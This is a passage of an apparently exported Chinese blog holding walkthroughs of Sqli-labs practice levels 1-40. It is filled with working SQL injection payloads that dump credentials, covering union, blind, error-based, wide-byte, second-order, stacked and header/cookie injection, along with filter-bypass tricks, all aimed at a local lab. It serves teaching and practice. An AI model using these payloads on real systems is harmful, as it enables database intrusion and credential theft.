?id=-1 union select 1,2,3 # Less-36与前面一样，没有多大区别，唯一发现区别就是井号#使用不了，要用--+代替，payload： ?id=-1%df%27 union select 1,2,3 --+ 但是看一下源码后，发现本关使用的过滤函数是mysql_real_escape_string()，受影响的字符：\\x00\\n\\r\\&#39;&quot;\\x1a，如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。 但是因mysql并没有设置成gbk，所以mysql_real_escape_string()依旧能够被突破。 还可以使用以下payload： ?id=-1%EF%BF%BD%27union select 1,2,3 --+ Notice:在使用mysql_real_escape_string()时，如何能够安全的防护这种问题，需要将mysql设置为gbk即可。设置代码：Mysql_set_charset(‘gbk’,’$conn’) Less-37与Less-34关原理差不多，只是过滤函数是mysql_real_escape_string()，同样使用万能钥匙登录，密码随意 �&#39; or 1=1# Less-38本关开始，考查的是堆叠注入的利用，关于堆叠注入的知识点可以看我的文章Sqli-labs Tips的Tip 5 在发现使用单引号包括参数之后，使用以下payload： ?id=1&#39;;insert into users(id,username,password) values(&#39;37&#39;,&#39;users37&#39;,&#39;password37&#39;);--+ 去数据库查询时，已经成功插入 Less-39本关与上一关区别只在于参数没有被包括，payload： ?id=1;insert into users(id,username,password) values(&#39;37&#39;,&#39;users37&#39;,&#39;password37&#39;);--+ Less-40本关与上一关区别只在于参数被(&#39;&#39;)包裹，payload： ?id=1&#39;);insert into users(id,username,password) values(&#39;37&#39;,&#39;users37&#39;,&#39;password37&#39;);--+ 至此，31-40关的Write-up结束 后一部分链接：第41-50关Write-up","categories":[],"tags":[{"name":"Sqli-labs","slug":"Sqli-labs","permalink":"https://knlvre.github.io/tags/Sqli-labs/"}],"author":"Knlvre"},{"title":"Sqli-labs(第21-30关)","slug":"Sqli-labs 第21-30关","date":"2019-01-30T16:00:00.000Z","updated":"2019-07-27T05:47:51.374Z","comments":true,"path":"2019/01/31/Sqli-labs 第21-30关/","link":"","permalink":"https://knlvre.github.io/2019/01/31/Sqli-labs 第21-30关/","excerpt":"","text":"前一部分链接：第11-20关Write-up Less-21与Less-20类似，只是对变量Cookiee进行了Base64加密，并且使用单引号和括号进行包裹 将payload进行加密 加入到 Cookie中，注入成功 Less-22与前面关卡类似，只是对$cookee包括采用了双引号 Base64加密一下payload： &quot; and extractvalue(1,concat(0x7e,(select group_concat(username,password) from users where id=2),0x7e))# 加密后： IiBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodXNlcm5hbWUscGFzc3dvcmQpIGZyb20gdXNlcnMgd2hlcmUgaWQ9MiksMHg3ZSkpIw Less-23查看源代码，本关将注释符：#、--进行了过滤，查询语句是通过单引号来包裹$id的 所以只需要将结尾的单引号处理掉就好了 爆表名： ?id=-1&#39; union select 1,（select group_concat(table_name) from information_schema.tables where table_schema=database()）,3 and &#39;1&#39;=&#39;1 其他的语句自行构造，不再赘述 Less-24本关考察二次排序注入（二次注入、存储型注入） 查看本关源代码 创建用户时的语句为： insert into users ( username, password) values(\\&quot;$username\\&quot;, \\&quot;$pass\\&quot;) 修改密码时的语句为： UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; 结题思路： 创建一个用户，名为admin&#39;#，密码随意，数据库执行以下语句： insert into users ( username, password) values(\\&quot;admin&#39;#\\&quot;, \\&quot;666\\&quot;) 返回首页，登陆这个新注册的admin&#39;#用户 登陆成功，可以直接修改密码，数据库执行了以下语句： UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;# and password=&#39;$curr_pass&#39; 此时admin用户的密码已经改成我们修改的那个密码了，可以直接登录 Less-25单引号包裹、题目提示我们or和and被过滤掉了 但是影响并不是很大，因为可以用双写绕过 information里面包含or，记得双写绕过就可以了：infoorrmation 其他的不再赘述 Less-25a没有用符号包裹、同样提示我们or和and被过滤掉了 其他和Less-25一样 Less-26过滤规则，过滤了：or、and、/、*、--、#、\\s空格、/、\\\\ function blacklist($id) { $id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id); //strip out OR (non case sensitive) $id= preg_replace(&#39;/and/i&#39;,&quot;&quot;, $id); //Strip out AND (non case sensitive) $id= preg_replace(&#39;/[\\/\\*]/&#39;,&quot;&quot;, $id); //strip out /* $id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id); //Strip out -- $id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id); //Strip out # $id= preg_replace(&#39;/[\\s]/&#39;,&quot;&quot;, $id); //Strip out spaces $id= preg_replace(&#39;/[\\/\\\\\\\\]/&#39;,&quot;&quot;, $id); //Strip out slashes return $id; } （1）or和and的绕过 or：用||代替 and:用&amp;&amp;代替 （2）空格的绕过 %09：tab键（水平） %0b：tab键（垂直） %0a：新建一行 %0c：新的一页 %0d：return功能 %a0：空格 由于井号#和--被过滤的，只能用||&#39;1处理掉末尾的单引号 不过我的环境好像不能使用上面的几种变换绕过空格，但是从27关开始又可以 ?id=0&#39;%0aunion%0aselect%0a1,2,3%0a||%0a&#39;1 Less-26a本关与前一关的区别在于，关闭了mysql报错 $sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;; //print_r(mysql_error()); 其他与前一关保持一致 Less-27过滤规则： 这里解释一下/m和/s的用法： /m：当设定了此修正符，行起始和行结束除了匹配整个字符串开头和结束外，还分别匹配其中的换行符的之后和之前。 /s：如果设定了此修正符，模式中的圆点元字符（.）匹配所有的字符，包括换行符。没有此设定的话，则不包括换行符。 function blacklist($id) { $id= preg_replace(&#39;/[\\/\\*]/&#39;,&quot;&quot;, $id); //strip out /* $id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id); //Strip out --. $id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id); //Strip out #. $id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id); //Strip out spaces. $id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id); //Strip out spaces. $id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id); //Strip out spaces. $id= preg_replace(&#39;/union/s&#39;,&quot;&quot;, $id); //Strip out union $id= preg_replace(&#39;/select/s&#39;,&quot;&quot;, $id); //Strip out select $id= preg_replace(&#39;/UNION/s&#39;,&quot;&quot;, $id); //Strip out UNION $id= preg_replace(&#39;/SELECT/s&#39;,&quot;&quot;, $id); //Strip out SELECT $id= preg_replace(&#39;/Union/s&#39;,&quot;&quot;, $id); //Strip out Union $id= preg_replace(&#39;/Select/s&#39;,&quot;&quot;, $id); //Strip out Select return $id; } 过滤union和select前面的关卡已经用过了，我们这里同理，用双写就可以绕过 值得注意的是这里的id不能再赋值为负数，因为出来的结果中-1会等于1，-2会等于2，以此类推，所以此处使用0就可以 payload： ?id=0&#39;%0auniunionon%0aSeLeCt%0b1,2,3%0a||&#39;1 Less-27a本关与前一关的区别在于，关闭了mysql报错 $sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;; //print_r(mysql_error()); 其他与前一关保持一致 payload： ?id=0&quot;%0aunion%0aSeLect%0a1,2,3%0a||%0a&quot;1 Less-28过滤规则： function blacklist($id) { $id= preg_replace(&#39;/[\\/\\*]/&#39;,&quot;&quot;, $id); //strip out /* $id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id); //Strip out --. $id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id); //Strip out #. $id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id); //Strip out spaces. //$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id); //Strip out spaces. $id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id); //Strip out spaces. $id= preg_replace(&#39;/union\\s+select/i&#39;,&quot;&quot;, $id); //Strip out UNION &amp; SELECT. return $id; } 本关不单独过滤union或select单词，而是过滤union select这个整体 解决办法就是同样的道理，双写就行 payload： ?id=0&#39;)%0aunion%0aunion%0aselectselect%0a1,2,3%0a||%0a(&#39;1 Less-28a过滤规则： function blacklist($id) { //$id= preg_replace(&#39;/[\\/\\*]/&#39;,&quot;&quot;, $id); //strip out /* //$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id); //Strip out --. //$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id); //Strip out #. //$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id); //Strip out spaces. //$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id); //Strip out spaces. //$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id); //Strip out spaces. $id= preg_replace(&#39;/union\\s+select/i&#39;,&quot;&quot;, $id); //Strip out spaces. return $id; } 这里注意到其他规则已经注释掉，只过滤union select这个整体 过滤规则更少更简单了，前一关的payload可以继续使用，当然也可以使用更简单的 payload： ?id=0&#39;) union union selectselect 1,2,3--+ Less-29至31这一部分训练的是HPP（HTTP Parameter Pollution），俗称HTTP参数污染。 开始看这题并没有发现index.php有WAF，后来发现原来是index.jsp用了WAF，关键代码如下。 &lt;% String id = request.getParameter(&quot;id&quot;); String qs = request.getQueryString(); String rex = &quot;^\\\\d+$&quot;; Boolean match=id.matches(rex); if(match == true) { URL sqli_labs = new URL(&quot;http://localhost/sqli-labs/Less-29/index.php?&quot;+ qs); URLConnection sqli_labs_connection = sqli_labs.openConnection(); } %&gt; 至此，21-30关的Write-up结束 后一部分链接：第31-40关Write-up","categories":[],"tags":[{"name":"Sqli-labs","slug":"Sqli-labs","permalink":"https://knlvre.github.io/tags/Sqli-labs/"}],"author":"Knlvre"},{"title":"Sqli-labs(第11-20关)","slug":"Sqli-labs 第11-20关","date":"2019-01-29T16:00:00.000Z","updated":"2019-07-27T05:47:44.969Z","comments":true,"path":"2019/01/30/Sqli-labs 第11-20关/","link":"","permalink":"https://knlvre.github.io/2019/01/30/Sqli-labs 第11-20关/","excerpt":"","text":"前一部分链接：第1-10关Write-up 前言之前其他资料学习过程中，学会一个挺好用的学习技巧 在源码中$sql变量下方加入以下内容 echo &quot;&lt;br&gt;&quot;.&quot;==================================================&quot;.&quot;&lt;/br&gt;&quot;; echo $sql; echo &quot;&lt;br&gt;&quot;.&quot;==================================================&quot;.&quot;&lt;/br&gt;&quot;; 网页可以看$sql的内容 Less - 11从源代码来看，提交的用户名为uname密码为passwd 用户名和密码都提交1，说登录失败 常规手段，在密码后面加一个单引号，报错 报错信息可以看出，对id参数用单引号包裹 那么此题从用户名注入和从密码注入都是可以的 order by测出字段数为2，直接union注入，得到database() 常规手段，爆出数据库名、表名、字段值 payload： uname=aa&amp;&amp;passwd=bb&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; # Less - 12这关HackBar好像出错了，无法POST双引号，直接用网页自带的输入框 uname提交aa，passwd提交bb&#39;，没有报错 uname提交aa，passwd提交bb&#39;&#39;，没有报错 uname提交aa，passwd提交bb&quot;，报错信息才出来，使用双引号加括号包裹 payload： uname=aa&amp;&amp;passwd=bb&quot;) union select username,password from users where id=2 # Less-13uname提交aa，passwd提交bb&#39;，报错，使用单引号加括号包裹 但是这关却是布尔注入 payload： uname=aa&amp;&amp;passwd=bb&#39;) or substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)&gt;&#39;e&#39; # 不再赘述 Less-14uname提交aa，passwd提交bb&quot;，报错，使用双引号包裹 同样是布尔注入 payload： uname=aa&amp;&amp;passwd=bb&quot; or substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,5)=&quot;email&quot; # Less-15本关无论怎么提交都没有报错信息 那就直接加上or 1=1 #来测试了 uname提交aa，passwd提交bb&#39;，加上or 1=1 #，页面回显正常，那我们就知道是通过单引号包裹的了 源码中的确可以看出来是单引号 同样是布尔注入 payload： uname=aa&amp;&amp;passwd=bb&#39; or substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,5)=&#39;email&#39; # Less-16uname提交aa，passwd提交bb&quot;)，加上or 1=1 #，页面回显正常，那我们就知道是通过双引号加括号包裹的了 和15关一样，只是将单引号改成双引号加括号就可以了 payload： uname=aa&amp;&amp;passwd=bb&quot;) or substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,5)=&#39;email&#39; # Less-17这题比较特殊，就从源代码开始看起吧 当uname和passwd传入时，uname会被check_input()这个自定义的函数给处理，这个自定义函数内容是： function check_input($value) { if(!empty($value)) { // truncation (see comments) $value = substr($value,0,15); } // 如果经过addslashes()函数出来，去掉转义 if (get_magic_quotes_gpc()) { $value = stripslashes($value); } // 如果不都是数字，就加上两个单引号（因为不是数字就是字符串） if (!ctype_digit($value)) { $value = &quot;&#39;&quot; . mysql_real_escape_string($value) . &quot;&#39;&quot;; } else { $value = intval($value); } return $value; } 对涉及到的函数进行解释一下： addslashes() 作用：函数返回在预定义字符之前添加反斜杠的字符串 预定义字符是：①单引号（&#39;）② 双引号（&quot;）③ 反斜杠（\\）④ NULL 提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。 注释：默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。 stripslashes() 作用：函数删除由 addslashes() 函数添加的反斜杠 mysql_real_escape_string() 作用：函数转义 SQL 语句中使用的字符串中的特殊字符 受影响字符：①\\x00 ②\\n ③\\r ④\\ ⑤&#39; ⑥&quot; ⑦\\x1a 如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。 ctype_digit() 作用：检测字符串中的字符是否都是数字，负数和小数会检测不通过 说明：本函数将 string 中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用于 mysql_query()。 在我们less17的check_input()中，对username进行各种转义的处理，所以此处不能使用username进行注入 那么这题的$sql变量是这样构造的： @$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;; 也就是说，当你传入的uname在数据库中存在时，才能返回信息 然后当有返回值时，执行以下语句 $update=&quot;UPDATE users SET password = &#39;$passwd&#39; WHERE username=&#39;$row1&#39;&quot;; mysql_query($update); 也就是说，当我们输入的uname在数据库里存在是，它就会帮我们修改这个对应的uname的密码，修改为我们输入的passwd 那我们此时就知道不能通过username进行注入，因为会被处理掉，那就通过password来进行 还是先加单引号看一下报错，发现就是通过单引号包裹的 有趣的是，如果我们此时加一个#号，就会把password后面的内容注释掉，那么$update变量就会是这样 $update=&quot;UPDATE users SET password = &#39;$passwd&#39;; 那么这句语句去执行的后果就是把users表里所有password都改成我们输入的值 害我再一个一个改回来。。。。 改回来之后开始注入，我们这关利用报错注入，复习一下updatexml()和extractvalue() updatexml() 格式： updatexml(1,concat(0x7e,(),0x7e),1) 例子： ①updatexml(1,concat(0x7e,(select database()),0x7e),1) ②updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) extractvalue() 格式： extractvalue(1,concat(0x7e,(),0x7e)) 例子： ①extractvalue(1,concat(0x7e,(select database()),0x7e)) ②extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),0x7e)) 那我们就使用updatexml()函数来进行报错注入： 注意：记得加上group_concat()，不然返回多行数据无法一起显示出来 uname=admin&amp;&amp;passwd=bb&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) # uname=admin&amp;&amp;passwd=bb&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),0x7e),1) # 当以常规想法，继续往下时发现报错了： uname=admin&amp;&amp;passwd=bb&#39; and updatexml(1,concat(0x7e,(select group_concat(username,password) from users where id=2),0x7e),1) # 出现了这句话：You can&#39;t specify target table &#39;users&#39; for update in FROM clause 翻译为：不能先select出同一表中的某些值，再update这个表(在同一语句中) 那就是前面提到的$update在为我们更新users表的时候，我们又去查询，所以冲突了，那怎么解决的？ 办法：加一层select uname=admin&amp;&amp;passwd=bb&#39; and updatexml(1,concat(0x7e,(select group_concat(username,password) from (select username,password from users where id=2)),0x7e),1) # 还是报错，显示：Every derived table must have its own alias 此时就需要在第二层的括号外，加上一个别名（什么都行） uname=admin&amp;&amp;passwd=bb&#39; and updatexml(1,concat(0x7e,(select group_concat(username,password) from (select username,password from users where id=2)hsw),0x7e),1) # 此时数据就被我们爆出来了 Less-18从源码可以看出，对uname和passwd都用函数check_input进行了处理，那就不能在这两处地方进行注入 可是看到了： $insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;; 并且这个$uagent变量来自于这里： 现在已经知道，通过HTTP请求包的User-Agent字段来进行注入 代码需要输入正确的用户名和密码才能执行$insert变量 第17关已经让我们修改了用户名密码，这关就可以使用 此处我们借用Burpsuits来进行注入，提交uname和passwd，并修改User-Agent为： User-Agent: &#39; and extractvalue(1,concat(0x7e,(select database()),0x7e)) or &#39;1&#39;=&#39;1 注意：在源代码中加上代码，显示$insert变量，来帮助学习 点击”go”，再返回的内容中，右击 —&gt; “Show response in browser” —&gt; 复制内容 —&gt; 在浏览器中粘贴查看 此时浏览器代理记得不能断开。做完这些步骤就可以看到内容： 解释一下$insert变量：我们构造的语句，始终没有逃出INSERT语句后的括号，所以要想办法将单引号包裹掉 爆数据： User-Agent: &#39; and extractvalue(1,concat(0x7e,(select group_concat(username,password) from users where id=2),0x7e)) or &#39;1&#39;=&#39;1 本关更新的表是uagents表，所以不再需要像前一关那样双层的select＋别名来注入，直接爆出数据 Less-19查看源代码，与前一关一样，只是将$uagent变量接受的值变成HTTP_REFERER 用Burpsuits抓包下来，发现没有Referer字段，那就自己加上去，并且改值： 注意：这里Referer不要加在最后一行，不然不会被归入头部信息中 Referer: &#39; and extractvalue(1,concat(0x7e,(select concat(username,password) from users where id=2),0x7e)) or &#39;1&#39;=&#39;1 原理和前一关一样，不再赘述 Less-20从源代码中可以看出，像之前关卡那样使用uname和passwd进行注入已经不行了，因为在数据库中没有对这两个语句做任何的查询 继续往下看，看到了： $cookee = $_COOKIE[&#39;uname&#39;]; $sql=&quot;SELECT * FROM users WHERE username=&#39;$cookee&#39; LIMIT 0,1&quot;; 利用Burpsuits添加Cookie: uname字段，之前的uname和passwd字段随意添加值 Cookie: uname=&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))# 发现返回Your Cookie is deleted 仔细看完源代码发现，注意到需要满足if条件，才会执行语句查询 那么只需要在Burpsuits中将&amp;submit=Submit删除掉就可以了 其余的语句自行补充，不再赘述 至此，11-20关的Write-up结束 后一部分链接：第21-30关Write-up","categories":[],"tags":[{"name":"Sqli-labs","slug":"Sqli-labs","permalink":"https://knlvre.github.io/tags/Sqli-labs/"}],"author":"Knlvre"},{"title":"Sqli-labs(第1-10关)","slug":"Sqli-labs 第1-10关","date":"2019-01-28T16:00:00.000Z","updated":"2019-09-01T06:22:13.591Z","comments":true,"path":"2019/01/29/Sqli-labs 第1-10关/","link":"","permalink":"https://knlvre.github.io/2019/01/29/Sqli-labs 第1-10关/","excerpt":"","text":"前言之前就有学习过一些关卡，但是由于当时没有搭建博客的想法，所以也就没有写下来属于自己的笔记。现在博客搭建完成了，从第一关开始，重新写下所有关卡的笔记，并且向后学习。 关于SQL注入的基础知识，可以看我自己整理的文章：Sqli-labs Tips 数据库名、表名、列名因为是学习用的，所以先告诉大家这个基于phpstudy搭建的sqli-labs学习过程中，较频繁使用的重要的数据库名、表名、列名： 数据库名：security security下的表名：emails，referers，uagents，users users下的列名：id，username，password Less - 1构造URL，传入id参数，赋值为1’，进行尝试。ps：注意后面这个单引号 http://127.0.0.1/AAsqli-labs/Less-1/?id=1&#39; 回车后我们得到了一个Mysql返回的错误，提示我们语法错误，我们通过这个猜出SQL语句对ID这个参数的处理 near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1 查看 index.php 文件内对于参数ID的处理，和我们猜想的一样 $sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;; 如果这个参数传入成功，SQL语句就会变成如下这样，多了一个单引号 $sql=&quot;SELECT * FROM users WHERE id=&#39;1&#39;&#39; LIMIT 0,1&quot;; 既然多了一个单引号会出现报错，那想办法将这个单引号去掉，会不会不报错并且正常显示呢，试一下 &#39; or 1=1 --+ http://127.0.0.1/AAsqli-labs/Less-1/?id=1&#39; or 1=1 --+ 如果这个参数传入成功，sql语句就会变成如下这样，这条语句因or 1=1所以为永恒真 $sql=&quot;SELECT * FROM users WHERE id=&#39;1&#39; or 1=1 --+&#39; LIMIT 0,1&quot;; 回车后就可以看到返回的内容： 可以看到我们通过 –+ 将这个多出来的单引号给注释掉了，成功返回内容 那么我们就可以利用这点，执行其他我们想要执行的语句，比如 order by (关于order by 开头有做简单介绍) 首先，我们看到 security-users 表有3列 如果我们执行 order by 3 就会成功，如果超过3就会失败，比如 order by 4 正确：http://127.0.0.1/AAsqli-labs/Less-1/?id=1&#39; order by 3 --+ 错误：http://127.0.0.1/AAsqli-labs/Less-1/?id=1&#39; order by 4 --+ 那么此时我们就知道了，可以利用这一点来猜某个表中有多少列 当id的数据在数据库中不存在时，前台页面返回了我们构造的union 的数据。此时我们可以id=-1，两个sql语句进行联合操作时，当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来 正确：http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&#39; union select 1,2,3 --+ 错误：http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&#39; union select 1,2,3,4 --+ 注意：因为前面我们已经通过 order by 3 知道该表有3列，所以这里要 select 1,2,3 不然会出错 此时我们就可以利用显示的位置，然后通过利用文章开头介绍的常用函数，来获取我们需要的信息，比如： http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&#39; union select 1,version(),database() --+ http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&#39; union select 1,@@version_compile_os,@@datadir --+ 结合前面的关于 information_schema 的知识，利用 union 命令进行联合注入（层层深入） 爆所有数据库名（第一层） 构造URL： http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&#39;union select 1,group_concat(schema_name),3 from information_schema.schemata--+ 如果这个参数传入成功，sql语句： $sql=&quot;SELECT * FROM users WHERE id=&#39;-1&#39;union select 1,group_concat(schema_name),3 from information_schema.schemata --+ &#39;LIMIT 0,1&quot; 爆security数据库的所有表名（第二层） 构造URL： http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schame=&#39;security&#39;--+ 如果这个参数传入成功，sql语句： $sql=&quot;SELECT * FROM users WHERE id=&#39;-1&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schame=&#39;security&#39; --+ &#39;LIMIT 0,1&quot; 爆users表的所有列名（第三层） 构造URL： http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&#39;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;--+ 如果这个参数传入成功，sql语句： $sql=&quot;SELECT * FROM users WHERE id=&#39;-1&#39;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;--+ &#39;LIMIT 0,1&quot; 爆具体数据（第四层） 构造URL： http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&#39;union select 1,username,password from users where id=1--+ 如果这个参数传入成功，sql语句： $sql=&quot;SELECT * FROM users WHERE id=&#39;-1&#39;union select 1,username,password from users where id=1--+ &#39;LIMIT 0,1&quot; Less - 2同样的构造URL，传入id参数，赋值为1’，进行尝试 http://127.0.0.1/AAsqli-labs/Less-2/?id=1&#39; 回车后我们得到了一个Mysql返回的错误，提示我们语法错误，我们通过这个猜出SQL语句对ID这个参数的处理 near &#39;&#39; LIMIT 0,1&#39; at line 1 所以这里应该是因为，奇数个单引号破坏了查询，导致抛出错误。因此我们得出的结果是，查询代码使用了整数 查看 index.php 文件内对于参数ID的处理，和我们猜想的一样 $sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;; 如果这个参数传入成功，SQL语句就会变成如下这样，多了一个单引号 $sql=&quot;SELECT * FROM users WHERE id=1&#39; LIMIT 0,1&quot;; 所以这关就不需要对单引号的问题进行处理，直接尝试进行注入 http://127.0.0.1/AAsqli-labs/Less-2/?id=-1 union select 1,2,3 --+ http://127.0.0.1/AAsqli-labs/Less-2/?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+ Less - 3构造URL，传入id参数，赋值为1’，进行尝试 http://127.0.0.1/AAsqli-labs/Less-3/?id=1&#39; 回车后我们得到了一个Mysql返回的错误，提示我们语法错误，我们通过这个猜出SQL语句对ID这个参数的处理 near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1 因此我们得出的结果是，查询代码使用了 (‘id’) 对参数进行了处理 查看 index.php 文件内对于参数ID的处理，和我们猜想的一样 $sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;; 如果这个参数传入成功，SQL语句就会变成如下这样，多了一个单引号 $sql=&quot;SELECT * FROM users WHERE id=(&#39;1&#39;&#39;) LIMIT 0,1&quot;; 所以这关就需要通过处理掉这个(‘$id’)，尝试进行注入 http://127.0.0.1/AAsqli-labs/Less-3/?id=-1&#39;) union select 1,2,3 --+ http://127.0.0.1/AAsqli-labs/Less-2/?id=-1&#39;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+ Less - 4构造URL，传入id参数，赋值为1’，进行尝试。发现没有返回报错信息，并尝试两个单引号，也是如此. http://127.0.0.1/AAsqli-labs/Less-1/?id=1&#39; http://127.0.0.1/AAsqli-labs/Less-1/?id=1&#39;&#39; 知道将单引号改成双引号报错信息才出现 http://127.0.0.1/AAsqli-labs/Less-1/?id=1&quot; 回车后我们得到了一个Mysql返回的错误，提示我们语法错误，我们通过这个猜出SQL语句对ID这个参数的处理 near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1 查看 index.php 文件内对于参数ID的处理，和我们猜想的一样 $id = &#39;&quot;&#39; . $id . &#39;&quot;&#39;; $sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;; 如果这个参数传入成功，SQL语句就会变成如下这样，多了一个双引号 $sql=&quot;SELECT * FROM users WHERE id=(&quot;id&quot;&quot;) LIMIT 0,1&quot;; 尝试进行注入 http://127.0.0.1/AAsqli-labs/Less-2/?id=-1&quot;) union select 1,2,3 --+ http://127.0.0.1/AAsqli-labs/Less-2/?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+ Less - 5这关开始，后面的几关开始接触到盲注了。关于盲注的知识可以看这篇博客的Tip 2部分：Sqli-labs Tips 老规矩，构造URL，传入id参数，赋值为1’，进行尝试 http://127.0.0.1/AAsqli-labs/Less-1/?id=1&#39; 回车后我们得到了一个Mysql返回的错误，提示我们语法错误，我们通过这个猜出SQL语句对ID这个参数的处理 near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1 所以这里应该是因为，奇数个单引号破坏了查询，导致抛出错误。 查看 index.php 文件内对于参数ID的处理，和我们猜想的一样 $sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;; 如果这个参数传入成功，SQL语句就会变成如下这样，多了一个单引号 $sql=&quot;SELECT * FROM users WHERE id=&#39;1&#39;&#39; LIMIT 0,1&quot;; （1）布尔注入 使用length()函数猜测数据库的长度 错误：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and length(database())=7 --+ 正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and length(database())=8 --+ 使用substr()函数猜测数据库的名称 错误：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,1)=&#39;a&#39; 正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,1)&gt;&#39;a&#39; 正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,1)=&#39;s&#39; 错误：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,1)&gt;&#39;s&#39; 同样，改变substr()函数里的参数，就可以截取想要猜测的字符，就这样一个个字符爆出来 正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,5)=&#39;secur&#39; 正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,8)=&#39;security&#39; 正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),3,6)=&#39;curity&#39; 当然也可以使用这种方法来爆表名、列名、数据等 正确：http://127.0.0.1/AAsqli-labs/Less-5/?id=1&#39; and substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1)&gt;&#39;a&#39; --+ 错误：http://127.0.0.1/AAsqli-labs/Less-5/?id=1&#39; and substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1)&gt;&#39;e&#39; --+ 正确：http://127.0.0.1/AAsqli-labs/Less-5/?id=1&#39; and substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,6)=&#39;emails&#39; --+ //当猜测出第一个表之后，改成limit 1,1 就可以猜测第二个表。关于limit的用法，不懂的话记得看前面有链接的Tips文章 （2）报错注入 xpath报错注入 http://127.0.0.1/AAsqli-labs/Less-5/?id=1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+ //爆数据库名称 http://127.0.0.1/AAsqli-labs/Less-5/?id=1&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+ http://127.0.0.1/AAsqli-labs/Less-5/?id=1&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 